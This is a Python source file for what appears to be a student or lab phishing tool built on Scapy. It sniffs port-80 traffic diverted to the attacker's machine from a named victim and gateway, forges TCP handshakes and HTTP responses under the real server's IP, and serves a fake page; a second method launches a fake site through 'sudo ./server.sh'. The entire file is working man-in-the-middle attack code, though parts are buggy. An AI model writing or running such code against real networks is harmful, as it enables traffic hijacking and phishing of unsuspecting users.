from scapy.all import *
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os


class SiteSender(BaseHTTPRequestHandler):
    def __init__(self, sitename_, victimIP_, gateIP_, victimMAC_, gateMAC_):
        self.myMAC="e4:ce:8f:2e:3e:de"
        self.sitename=sitename_
        self.victimIP=victimIP_
        self.gateIP=gateIP_
        self.victimMAC=victimMAC_
        self.gateMAC=gateMAC_
        self.content=None
        self.header="HTTP/1.1 200 OK\x0d\x0aDate: Wed, 29 Sep 2010 20:19:05 GMT\x0d\x0aServer: Testserver\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length:"
        self.options=[("MSS", 1460)]

    def get_content(self):
        if self.sitename == "hello_world":
            self.content=open("websites/hello_world/hello_world.html", "r").read()

    def write_content_in_current(self):
        print("[phishing][*] writing site content in current.txt")
        f = open("websites/current.txt", "w")
        f.write(self.content)

    def handle_pkt(self, pkt):
        print("[phishing][?] packet received")
        #for the moment, fake every time and every requested sites
        if pkt[Ether].dst == self.myMAC:
            self.fake(pkt)
        
    def forward_packet(self, pkt):
        print("[phishing][*] forward packet")
        pkt[Ether].dst=gateMAC
        sendp(pkt)
        print("[phishing][*] pkt from {src} redicted".format(src=pkt[IP].src))

    def wait(self):
        print("[phishing][*] start waiting for connections")
        sniff(count=0, prn=self.handle_pkt, filter="tcp and port 80")

    def fake(self, pkt):
        print("[phishing][*] faking website")
        self.get_content()
        port=pkt[0].sport
        sequence_number=pkt[0].seq
        ack_number=pkt[0].seq+1
        print(self.victimIP)
        #etait pkt[0].dst dans le code, 0 => Ether
        print(pkt[IP].dst)
        ip=IP(src=pkt[IP].dst, dst=self.victimIP)
        TCP_SYNACK=TCP(sport=80, dport=port, flags="SA", seq=sequence_number, ack=ack_number, options=self.options)
        ans=sr1(ip/TCP_SYNACK)
        get_http=sniff(filter="tcp and port 80", count=1, prn=lambda x: x.sprintf("{IP:%IP.src%: %TCP.dport%}"))
        ack_number+=len(get_http[0].load)
        sequence_number=pkt[0].seq+1
        if len(get_http[0].load) > 1:
            print(get_http[0].load)
        to_send=self.header + self.content
        print("[phishing][?] content to send\n" + to_send)
        tcp=TCP(sport=80, dport=port, flags="PA", seq=sequence_number, ack=ack_number, options=self.options)
        ackdata=sr1(ip/tcp/to_send)
        ack_number=ackdata.ack
        closing=TCP(sport=80, dport=port, flags="RA", seq=sequence_number, ack=ack_number, options=self.options)
        send(ip/closing)
        
    def fake2(self):
        self.get_content()
        self.write_content_in_current()
        print("[phishing][*] launching fake website")
        os.system("sudo ./server.sh")
